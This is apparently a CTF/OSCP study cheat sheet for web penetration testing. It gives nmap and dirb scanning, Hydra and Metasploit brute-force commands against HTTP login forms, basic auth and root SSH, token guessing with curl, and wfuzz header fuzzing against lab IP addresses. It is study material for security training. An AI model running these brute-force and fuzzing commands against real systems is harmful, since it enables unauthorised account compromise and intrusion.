* [Basic Scanning](#basic-scanning)
* [Directory Listing](#directory-listing)
* [Authentication](#authentication)
  * [Basic Authentication](#basic-authentication)
    * [metasploit](#metasploit)
    * [hydra](#hydra)
      * [http-get](#http-get)
      * [http-post-form](#http-post-form)
      * [ssh](#ssh)
   * [Token Authentication](#token-authentication)
* [Header Fuzzing and Manipulation](#header-fuzzing-and-manipulation)
  * [Fetch Header](#fetch-header)
  * [wfuzz](#wfuzz)
    * [User Agent String](#user-agent-string)
    * [Header Missing](#header-missing)
  

# Basic Scanning
```sh
# version of the running services
# -sV: Probe open ports to determine service/version info
# -sC: equivalent to --script=default
nmap -sV -sC 192.165.34.3

# curl -I to fetch headers and read the protection type from those headers
curl -I http://192.165.34.3/dir
```
# Directory Listing
```sh
# bruteforce on web server directories and list the names of directories found using msfconsole
use auxiliary/scanner/http/brute_dirs

# DIRB  IS  a  Web Content Scanner. It looks for existing (and/or hidden) Web Objects. It basically works by
# launching a dictionary basesd attack against a web server and analizing the response.
# Note: Please remember to remove the preceding ‘/’ from each of directory name entry (in the
# directory.txt). Without this change, dirb won’t work.
dirb http://192.166.161.3 directory.txt
```
## Using `curl` and bash script
We can use curl to check for all the directories listed in the wordlist. This can be done by a following wrapper bash script
<https://github.com/jai-the-seeker/CTF-OSCP/blob/master/scripts.md#directory-listing>

# Authentication
## Basic Authentication
### metasploit 

`http_login` module
```sh
use auxiliary/scanner/http/http_login
set RHOSTS 192.165.34.3
set USER_FILE /tmp/users
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
set AUTH_URI /poc/
exploit
```
### Hydra
#### http-get
Options

`-l` single LOGIN name or `-L` FILE having list of LOGIN names

`-p` single PASSWORD  or `-P` FILE having list of passwords

`-t` Number of threads per target (default: 16)
```sh
hydra -L unix_users.txt -P passwords.txt 192.148.69.3 http-get /
```
#### http-post-form
Ref
* <https://redteamtutorials.com/2018/10/25/hydra-brute-force-https/>
* <https://www.youtube.com/watch?v=fFnEdoCyVhk&list=PLYmlEoSHldN7HJapyiQ8kFLUsk_a7EjCw&index=63>

syntax
```sh
hydra -L <USER> -P <Password> <IP Address> http-post-form "<Login Page>:<Request Body>:<Error Message>"
```
Example:
```sh
hydra -L usernames.txt -P passwords.txt 192.168.2.62 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login Failed"
```
#### ssh
```sh
hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt -t 6 ssh://192.168.1.123
```
## Token Authentication
Hydra and metasploit `http_login` module doesn’t support token authentication.
We have to set the token in headers for token auth to work.
```sh
curl -H 'Authorization: Token <token>' 192.183.171.3
```
We have to write a custom wrapper around this command. In the script, we will rely on the fact
that on using the correct token, we will get something else than "Unauthorized Access".

You can refer this script <https://github.com/jai-the-seeker/CTF-OSCP/blob/master/scripts.md#authorization-token>

After performing the dictionary attack we will get the password, which can be used to set the token in the headers
```sh
curl -H 'Authorization: Token 123123123' 192.186.248.3
```


# Header Fuzzing and Manipulation
## Fetch Header
```sh
# curl -I to fetch headers and read the protection type from those headers
curl -I http://192.165.34.3/dir
# msfconsole
use auxiliary/scanner/http/http_header
```
## wfuzz
Official Website
* <https://wfuzz.readthedocs.io/en/latest/user/basicusage.html#fuzzing-paths-and-files>

There are two db wordlists associated with `wfuzz` which can be obtained from
* <https://code.google.com/p/fuzzdb/>
* <https://github.com/danielmiessler/SecLists>
### User Agent String
We can use `wfuzz` to check for various valid strings of the `User-Agent` by passing it a wordlist containing possible user agents strings.
The word list can of user-agents can be obtained from <https://github.com/fuzzdb-project/fuzzdb/blob/master/discovery/UserAgent/UserAgentListCommon.txt>
```sh
wfuzz -c -z file,user-agent.txt -H "User-Agent: FUZZ" http://192.8.221.3/secret
```
output
```sh

000001:  C=200      1 L        2 W           39 Ch        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6"
000002:  C=403      1 L        2 W           15 Ch        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)"
```
Here response code of `200` indicates that the `user-agent-string` is valid. The same can now be used with `curl` to verify and access the webpage
```sh
curl -H "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6" 192.8.221.3/secret
```
### Header Missing
Refs:
* <https://rootflag.io/hack-the-box-control/>

In case we see some message like `Access Denied : Header Missing`, it seems that it's expecting a certain header parameter. We can use `wfuzz` to try and determine what it might be looking for. So we can create a list of all the HTTP header responses from here. So we have some header types to fuzz now we just need our target. We were given a hint earlier that we had some files stored on a 192.168.4.28 address. We can generate a list of every IP in that scope and use that. This is what our total command will look like:
Command:
```sh
wfuzz -c -w http-headers-fuzz.txt -w ip-192-168-4-0.txt --hs "Header Missing" --sc "200" -H "FUZZ:FUZ2Z" "http://10.10.10.167/admin.php"
```
A quick breakdown of the above command:

`-c` will output with colors, I like colors.

`-w` specifies a wordlist.

`--hs` will hide responses of the type following it. In this case "Header Missing".

`--sc` will show response codes of the type following it. In this case 200.

`-H` specifies header parameters.

`FUZZ:FUZ2Z` These are the two header parameters we are fuzzing. `FUZZ` is for the first wordlist specified. `FUZ2Z` is for the second word list specified. So we have something like this in the header of our request: "Acces-Control-Allow-Origin:192.168.4.44"

`http://10.10.10.167/admin.php` Lastly, the target URL.